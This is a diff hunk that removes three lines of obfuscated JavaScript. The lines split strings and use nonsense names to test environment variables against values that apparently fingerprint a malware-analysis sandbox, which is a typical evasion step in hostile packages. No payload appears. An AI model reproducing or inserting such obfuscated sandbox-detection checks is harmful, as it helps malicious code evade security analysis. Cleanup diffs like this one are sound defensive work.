@@ -1,3 +1,0 @@
-let fight = capture_pictures(plop, 'COMPLU' + 'S_ProfAPI_Profi' + 'lerCompa'.concat('tibilitySetting'), 'EnableV2Profiler') &&
-        capture_pictures(plop, 'FPS_BROWS'.concat('ER_APP_PROFILE_STRING'), ['Internet', 'Explorer'].join(' ')) &&
-        capture_pictures(plop, 'Path', 'C:\\WINDOWS\\System32\\Ope'.concat('nS' + 'SH') + '\\;c:\\' + takeAndGive('Files', 'Program ') + '\\nodejs\\;c:\\Stra'+'wberry\\c\\bin;c:\\Stra' + 'wberry\\perl\\site\\bin;c:\\Stra' + 'wberry\\perl\\bin')
